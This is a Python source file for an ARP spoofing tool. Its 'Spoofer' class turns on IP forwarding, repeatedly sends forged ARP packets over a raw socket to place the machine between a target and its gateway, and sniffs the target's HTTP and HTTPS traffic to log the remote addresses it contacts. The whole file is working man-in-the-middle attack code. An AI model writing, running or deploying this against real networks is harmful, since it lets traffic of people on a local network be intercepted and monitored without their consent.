import time
import threading
from socket import htons, ntohs, socket, PF_PACKET, SOCK_RAW

import pyshark

from .packets import ARPSetupProxy

class Spoofer(object):
    def __init__(
        self,
        interface: str,
        attackermac: str,
        gatewaymac: str, 
        gatewayip: str, 
        targetmac: str, 
        targetip: str,
        interval: float,
        disassociate: bool,
        ipforward: bool,
    ):
        self.__interval = interval
        self.__ipv4_forwarding = ipforward
        self.__arp = ARPSetupProxy(interface, attackermac, gatewaymac,
                                   gatewayip, targetmac, targetip,
                                   disassociate)
        
        self.__interface = interface
        self.__target_ip = targetip
        self.running = False
        self.thread = None
        self.captureThread = None
        self.lock = threading.Lock()

        self.visited_ips = set()

    def execute(self):
        with self.lock:
            if self.running:
                return  # Do not start if it's already running
            self.__check_ipv4_forwarding()
            self.__display_setup_prompt()
            self.running = True
            self.thread = threading.Thread(target=self.__send_attack_packets)
            self.captureThread = threading.Thread(target=self.capture_packets)
            self.thread.start()
            self.captureThread.start()

    def stop(self):
        with self.lock:
            if not self.running:
                return
            self.running = False
            self.visited_ips.clear()
            if self.thread:
                self.thread.join()
            if self.captureThread:
                self.captureThread.join()
        
    def __check_ipv4_forwarding(self, config='/proc/sys/net/ipv4/ip_forward'):
        if self.__ipv4_forwarding is True:
            with open(config, mode='r+', encoding='utf_8') as config_file:
                line = next(config_file)
                config_file.seek(0)
                config_file.write(line.replace('0', '1'))

    def __display_setup_prompt(self):
        print('\n[>>>] ARP Spoofing configuration:')
        configurations = {'IPv4 Forwarding': str(self.__ipv4_forwarding),
                          'Interface': self.__arp.interface,
                          'Attacker MAC': self.__arp.packets.attacker_mac,
                          'Gateway IP': self.__arp.packets.gateway_ip,
                          'Gateway MAC': self.__arp.packets.gateway_mac,
                          'Target IP': self.__arp.packets.target_ip,
                          'Target MAC': self.__arp.packets.target_mac}

        for setting, value in configurations.items():
            print('{0: >7} {1: <16}{2:.>25}'.format('[+]', setting, value))

    def __send_attack_packets(self):
        with socket(PF_PACKET, SOCK_RAW, ntohs(0x0800)) as sock:
            sock.bind((self.__arp.interface, htons(0x0800)))
            while self.running:
                for packet in self.__arp.packets:
                    sock.send(packet)
                time.sleep(self.__interval)

    def capture_packets(self):
        capture = pyshark.LiveCapture(
                interface=self.__interface,
                display_filter="tcp.port == 80 || tcp.port == 443")

        for packet in capture.sniff_continuously():
            if not self.running:
                print("not runnin")
                break
            if hasattr(packet, 'ip'):
                src_ip, dst_ip = packet.ip.src, packet.ip.dst
                print(src_ip, dst_ip)
                if src_ip == self.__target_ip or dst_ip == self.__target_ip:
                    ip = src_ip if dst_ip == self.__target_ip else dst_ip
                    if ip not in self.visited_ips:
                        self.visited_ips.add(ip)

